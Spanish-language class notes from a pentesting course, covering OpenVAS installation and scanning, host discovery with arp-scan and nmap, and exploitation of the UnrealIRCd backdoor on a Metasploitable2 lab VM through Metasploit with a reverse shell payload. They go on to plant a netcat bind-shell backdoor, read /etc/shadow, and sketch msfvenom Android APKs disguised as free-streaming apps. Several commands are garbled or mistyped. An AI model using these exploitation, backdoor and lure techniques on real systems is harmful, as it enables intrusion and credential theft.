Entonces el mejor analizador que huvo fue Nessus
Esti tenía un Core y un Frontend.

Entonces los NASL era Network Attack Script Lang, que analiza vulnerabilidades de forma exhaustiva, aún está pero sin frontend pero algo generoso fue dejar el core de forma LGP y crear analizadores de vulnerabilidades y salió un escanera de auditorias de vulnevs (OpenVAS) y mira los net-vuln-treaths

Ahora podemos pedir a la IA conocer los exploits pero mejor con NMAP pero OpenVAS es aún beta, es bueno, pero intenta ser un NESSUS en versión libre, es inestable y cuesta ponerlo, falla por cualquier cosa y pailas. El maestro Pereira ha estado en cositas de Pentesting y en el CiberGaula (es muy youtuber) y publicó un truquito en la instalación del OpenVAS. Dentro el campus virtual en la sección de pentesting está la Config OpenvAS (el proceso es hacer un update, upgrade, un install, un greenvon, inicializar un postgre, alimentar para sincronizar metadatos de GVM, luego sincroniza las vistas de tablas como NVT como caché para que por cada servicio no deba ir a Mitre estas NBT y sincroniza eso, y lo que pillaron es que luego al hacer el CERT [por ejemplo cuando uno tirea un proceso como `ps` es que sale algo y terminó el proceso] pero acá el comando es que cuando actualiza los certificados de las baterías de ataques, ejecuta y muestra la shell y luego hace el gvm-start y falla, pero resulta que es porque no ha terminado, por lo que toca ir a mirar con htop (mirando carga de memoria, procesos, y hasta que no llegue al 100% pues no ha terminado de mirar lo de las NBTs)) si se pone a punto porque la primera capa de (servicios operacionales) permite interactuar con metodos y funciones.  


Entonces se mete activa el OpenVAS y va a crear una New Task, pone 
- Name: ScanWXP6M2025
- Como mucho pone la IP y le da play. hace la req, avanza y demora al menos 15/20 mins, pero quedan muy lindos los reportes.

Entonces cuando termina le da por la severidad y accede, le dice en Results la severidad, donde 10 pues es que murio, eso ya no tiene ni parches ni seguridad ni nada, dice que tieen vulnerabilidades sobre el servicio SMB, puede que tenga una de ICMB que está en low, tiene algo que es un download  y mira los reportes y hay varios formatos para descargar.

Entonces saca como un latex del report, que va de lo más importante al menos. Entonces lo que está en rojito uno lo anota porque esos errores MS pues pueden tener más vinculaciones. Por ejemplo el (Ethernal Blue = MS17-017)

Eso en resumen ataca pero no explota (no manda el payload, demuestra que es vulnerable, no simplemente porque ocrrelacionea la versión con la CVE pero no manda el ataque, que pues es lo que hace metasploit)

Al final hace un `sudo gvm-stop`.

---
En VMWare es por NAT y arrancamos la otra máquina a explotar, es Metasploitable2-Linux, esta lanza muchos servicios con configuraciones por default, cuando uno despliega en producción debe hacer una guía de Hardening, porque en los entornos de cloud, antes de hacer todo eso es meter restricciones de variables, deshabilitar servicios.. Si uno tiene un OS para prestar servicios entonces para qué meterle interfaz? Por ejemplo un ubuntu que manda voleo servicios.

Entonces entra con MSFADMIN, el reconocimiento pasivo hacaerlo una sóla vez, 3 exploits y al menos de 3 sistemas /serv/protocolos diferentes, no todo por metasploit sino un win, lin, android y bueno, al menos sobre 3 sistemas, reconocer la IP al menos pues una vez jaja.

Entonces mete user, pass y mira que ahí sale la IP.

Entonces vamos a nuestros. Y si en el cali hicimos una identificación de puertos nos muestra el 139 y 445 que son cosas de ms pero pues es por zamba.


> Cómo identificar las máquinas a las que estoy conectado.
>
> Primero es entender que la arquitectura es punto a punto con intermediarios, de forma que primero hacemos un
> `sudo arp-scan -I eth0 --localnet`
>
> Entonces pues nos salen varios dispositivos y reconocemos que pues una dirección es broadcast (255 al final), la otra que tiene el .1 pues uno identifica es su gateway, la que tiene .2 pues es uno y entonces quedan 2, estas toca buscar entonces qué son, hagmámoslo por ping, de forma que sabemos que las MS responden con 128 ms mientras que las linux con 64(+/-)1. 


Entonces hace un `sudo nmap -sC -sV 192.168.211.130` y pues mira a ver qué información interesante le sale (silencioso es que apaga flags TCP para evitar alarmas. Entonces disecciona el paquete y con PCAP y entonces cambia las banderas para apagarlas en el paquete).

Entonces al mirarlo tiene un servicio de Apache, que Mysql, mirando tienee que el 56667 que tiene UnrealIRCd, este es el sistema de echat más antiguo que existe y se usa muchísimo en comunidades de hackers, en wikileaks para comunicaciones sincronas y asíncronas, tiene una ventaja enorme sobre los chats de ahora como telegram wasap o gchat, porque es peer to peer, a los hackers les gusta mucho porque no pasa por ningún servidor, es punto a punto con usuarios anónimos, es asíncrono hasta que se conecte, pero si no pues puede ser que lo envíe en cualquier momento, y eso, no se breachea ni almacena ni nada. La seguridad de Wasa o telegram etc pues pasa por un servidor central que no se conoce quién lo pueda atacar y filtrar.

El 65% de las peticiones de la deep web para acceder a constraseñas tiene que ver con asuntos de pareja.

Entonces vamos a `cd usr/share/nmap/scripts`

`ls -la | grep mysql` porque vimos que había algo de Mysql, por ejemmplo nos sale que si hay usuarios sin contraseña, entonces miramos con

`sudo nmap --script mysql-empty-password <192.168...>`

y nos sale que por el 3306 la cuenta root no tiene contraseña

Entonces si hace 

`mysql -h 192.168.122.156 -n -root`

Pero entonces que no explotamos esa vulnerabilidad sino otra del ircD

`ls -la | grep irc`

Entonces cuando miramos que en modo verboso salían datos salió algo que era algo del unreal.

Entonces `sudo nmap --script irc-unrealircd-backdoor 192.168.116.129` y entonces va a intentar y eureca!

En el puerto 6667 dice que ay una versión trojanizable. Y entonces tenemso algo para mysql y 

Entonce ahora vamos a metasploit, va al path

`cd usr/share/metasploit-framework/modules/explits` 

Y podría seguir navegando por los OS pero pues sabe que no es un HP, ni un irix, puede ser linux, puede ser unix pero uno puede buscar:

`find . -name "*irc*" -print`
busque desde ahí un patron regular que tenega y botelo como salida estandar . Si quiere paquetes entre comillas y separa cada path con punto y coma.

Entonces encontró varios, dos de windows así que descarados, pero pues salió algo de "irc/unreal" que coincide con lo que vimos antes, así que lo copiamos `unix/`


Entonces arranca el postgre por si acaso con `sudo postgre init??? algo así`

Y entonces hace el `msfconsole` para empezar la consola del Meta Sploit Framework. En este caso se hace un reverse solito (no TCP) y tiene un path por defecto, acá toca poner una variable para que sugiera el payload.

Entonces hacemos un
`use exploit/unix/irc/` tab porque sólo hay uno
`use exploit/unix/irc/unreal_irc...` enter y configuramos

`set rhost 192.168.116.129` y no tenemos ni payload ni nada que nos identifique
si hacemos `show payloads` y el que mejor nos sirve es `payload/cmd/unix/reverse` no como antes y uno pone `set payloads payload/cmd/unix/reverse` y ahora sí nos salió el LHOST. Entonces hacemos un `set lhost 192.168.126.8` que somos nosotros.
Entonces ya tentemos todo, el servicio unreal listo, el lport (por donde hace la conexión reverse) y el automatic target.

Entonces le damos `exploit` y listo.

Acá no botó prompt pero es porque esa versión no sale nada, entonces limpiamos y un `id` y sale somos rooot
y luego si ponemos `mkdir /root/HACKN6M2025`
Y con `ls` ahí sale la carpeta, somos god.

---
Entonces vamos a intentar dejar un Backdoor, porque puede que la máquina se parche pero 

Entonces está en netcad, va sobre WIN, LIN, en otrora se usaba para mandar servicios en puertos (viejito jsj) cuando gestionamos bases de datos vamos a un yaml, xml, y ponemos el puerto para escuchar el servicio (dbport, httport, lo que sea) en apache mavem lo que sea, antes uno debía asociar el coso con `netcan -listen -p 8080 /bin/mysqldev` pero ahora es como con un fichero de li,+

Entonces hacemos un `netcat -l -v -o 666 -e /bin/bash`
-e es execute. Deje en listen veboso el puerto 666 y deje una bash abierta por ahí.

Entonces en el Kali donde sea como uno dejó una puerta abierta hace un telnet, -nc netcat, ssh
`ncat .116.129 666` y entonces ahí queda abierto y entra `net /etc/shadow`


---
El mares nos muestra sobre android, el entorno MSFC Venom, utiliza combinaciones de exploits local, que ejecuta convenciendo, con que le haga escaner 3d y se instala (decir que puede ver cualquier torneo gratis, que resuelve preguntas, lo que sea) genera apk .bin y crea un exploit local y se abre con otro remoto multihandler, que le pega a todo (mac, android, win, etc etc...)